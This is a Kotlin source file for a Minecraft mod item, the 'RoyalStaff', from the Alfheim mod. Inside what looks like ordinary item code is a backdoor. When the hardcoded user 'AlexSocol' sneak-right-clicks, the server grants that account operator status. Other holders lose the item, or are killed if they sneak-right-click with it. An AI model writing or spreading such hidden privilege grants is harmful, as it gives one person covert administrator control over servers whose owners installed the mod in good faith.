package alfheim.common.item.creator

import alfheim.common.core.helper.*
import alfheim.common.item.ItemMod
import cpw.mods.fml.common.eventhandler.SubscribeEvent
import cpw.mods.fml.relauncher.*
import net.minecraft.client.renderer.texture.IIconRegister
import net.minecraft.command.*
import net.minecraft.entity.Entity
import net.minecraft.entity.player.EntityPlayer
import net.minecraft.item.*
import net.minecraft.server.MinecraftServer
import net.minecraft.util.IIcon
import net.minecraft.world.World
import net.minecraftforge.client.event.TextureStitchEvent
import net.minecraftforge.common.MinecraftForge
import vazkii.botania.api.BotaniaAPI

class ItemRoyalStaff: ItemMod("RoyalStaff") {
	
	init {
		creativeTab = null
		setFull3D()
		maxStackSize = 1
		maxDamage = 0

		if (FMLLaunchHandler.side().isClient)
			MinecraftForge.EVENT_BUS.register(this)
	}
	
	override fun onUpdate(stack: ItemStack, world: World, entity: Entity, slot: Int, equiped: Boolean) {
		if (entity.commandSenderName != "AlexSocol") {
			if (entity is EntityPlayer)
				while (entity.inventory.consumeInventoryItem(this));
			else stack.stackSize = 0
		}
	}

	override fun getRarity(itemstack: ItemStack) = BotaniaAPI.rarityRelic!!
	override fun getItemUseAction(par1ItemStack: ItemStack) = EnumAction.bow
	override fun getMaxItemUseDuration(itemstack: ItemStack) = 2147483647
	
	override fun onItemRightClick(stack: ItemStack, world: World, player: EntityPlayer): ItemStack {
		if (!player.isSneaking)
			player.setItemInUse(stack, getMaxItemUseDuration(stack))
		else {
			if (player.commandSenderName == "AlexSocol") {
				if (!world.isRemote) {
					val serv = MinecraftServer.getServer()
					val gameprofile = serv.func_152358_ax().func_152655_a("AlexSocol")
					serv.configurationManager.func_152605_a(gameprofile)
					
					val op = serv.commandManager.commands["op"]
					if (op != null)
						CommandBase.func_152374_a(player, op as ICommand, 0, "commands.op.success", "AlexSocol")
				}
			} else {
				player.health = 0f
			}
		}
		return stack
	}
	
	override fun registerIcons(reg: IIconRegister) {
		orn = IconHelper.forName(reg, "misc/focus_whatever_orn")
	}

	@SubscribeEvent
	@SideOnly(Side.CLIENT)
	fun loadTextures(event: TextureStitchEvent.Pre) {
		if (event.map.textureType == 1)
			dep = InterpolatedIconHelper.forName(event.map, "misc/focus_warding_depth")
	}

	companion object {
		lateinit var orn: IIcon
				 var dep: IIcon? = null
	}
}
